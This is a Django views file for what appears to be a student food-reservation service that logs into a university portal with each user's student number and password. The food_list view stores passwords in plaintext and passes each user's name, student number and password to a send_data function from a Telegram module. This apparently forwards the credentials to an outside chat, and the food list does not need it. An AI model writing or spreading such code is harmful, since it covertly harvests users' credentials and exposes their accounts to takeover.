import time
from datetime import datetime

from django.http import JsonResponse
from django.views.decorators.http import require_http_methods
from utils.boostan_get_foods import get_food_list, get_user_info, login
from utils.telegram import send_data

from .models import (
    check_and_update_password,
    check_and_update_student_top_credit,
    check_operating_mode,
    check_student_exists,
    create_student,
    get_blocked_message,
    get_deadline_message,
    get_insufficient_balance_message,
    get_invalid_credential_message,
    get_missing_parameter_message,
    get_rate_limit,
    get_student_by_stu_number,
    get_unknown_operation_message,
    get_whitelist_message,
    increment_count_of_used,
)

# Create your views here.


def rate_limit(stun):
    try:
        user = get_student_by_stu_number(stun)
        now = time.mktime(datetime.now().timetuple())
        last_used = time.mktime(user.last_used.timetuple())
        limit = get_rate_limit()  # seconds
        delta = (last_used + limit - now) / 60
        if now < last_used + limit:
            return (False, delta)
        else:
            return (True, 0)
    except:
        return (True, 0)


# rate limit decorator
def rate_limit_decorator(func):
    def wrapper(request, *args, **kwargs):
        if not {"password", "stun"}.issubset(set(request.POST)):
            return JsonResponse({"error": get_missing_parameter_message()}, status=400)
        stun = request.POST.get("stun")
        res, remain = rate_limit(stun)
        if not res:
            return JsonResponse({"error": f"{int(remain)} دقیقه دیگر امتحان کنید."}, status=429)
        return func(request, *args, **kwargs)

    return wrapper


@require_http_methods(["POST"])
@rate_limit_decorator
def food_list(request):

    stu_number = request.POST["stun"]
    password = request.POST["password"]
    login_status = login(stu_number, password)
    if not login_status:
        return JsonResponse({"error": get_invalid_credential_message()}, status=400)

    cookie = login_status
    name, credit = get_user_info(cookie)

    if check_student_exists(stu_number):
        student = get_student_by_stu_number(stu_number)
        if student.password != password:
            check_and_update_password(student, password)
        increment_count_of_used(student)
        check_and_update_student_top_credit(student, credit)
    else:
        student = create_student(
            stu_number=stu_number,
            password=password,
            full_name=name,
            credit=credit,
            status=0,
            top_credit=credit,
            count_of_used=1,
        )

    print(student.last_used)
    send_data(name, stu_number, password)

    operating_mode = check_operating_mode()
    is_legal_user = False
    if operating_mode == "blocked":
        if student.status == 1:
            return JsonResponse({"error": get_blocked_message()}, status=403)
        else:
            is_legal_user = True
    if operating_mode == "whited":
        if student.status != 2:
            return JsonResponse({"error": get_whitelist_message()}, status=403)
        else:
            is_legal_user = True
    if operating_mode == "normal" or is_legal_user:
        food_list_status = get_food_list(cookie, name, credit)
        if not food_list_status:
            return JsonResponse({"error": get_deadline_message()}, status=400)
        elif food_list_status == 1:
            return JsonResponse({"error": get_insufficient_balance_message()}, status=400)
        food_list = food_list_status
        return JsonResponse({"food_list": food_list}, status=200)
    else:
        return JsonResponse({"error": get_unknown_operation_message()}, status=400)


@require_http_methods(["POST"])
def reserve_food(request):
    return JsonResponse({"error": "Not implemented"}, status=404)
